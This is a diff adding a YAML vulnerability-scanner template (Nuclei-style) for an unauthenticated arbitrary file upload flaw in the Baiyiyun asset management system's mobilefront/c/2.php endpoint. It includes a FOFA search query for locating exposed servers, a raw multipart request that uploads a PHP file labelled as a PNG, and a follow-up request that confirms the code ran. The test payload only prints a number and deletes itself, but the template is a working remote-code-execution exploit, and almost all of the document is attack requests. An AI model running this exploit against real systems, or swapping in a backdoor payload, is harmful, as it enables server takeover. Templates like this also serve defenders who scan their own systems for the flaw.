@@ -1,0 +1,50 @@
+id: baiyiyun-2_php-File-upload
+
+info:
+  name: 百易云资产管理运营系统 mobilefront/c/2.php 任意文件上传漏洞复现
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="不要着急，点此"
+    百易云资产管理运营系统 mobilefront/c/2.php 接口存在文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s/jDOK8ndTk8a-8G74RWMIzg?token=974751616&lang=zh_CN
+  tags: File upload
+
+
+  
+http:
+  - raw:
+      - |
+        POST /mobilefront/c/2.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        
+        -----------------------------289666258334735365651210512949
+        Content-Disposition: form-data; name="file1"; filename="2.php"
+        Content-Type: image/png
+
+        <?php print(111*222);unlink(__FILE__);?>
+        -----------------------------289666258334735365651210512949--
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '(\d+\.php)'
+         internal: true
+  - raw:
+      - |
+        GET /mobilefront/c/images2/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
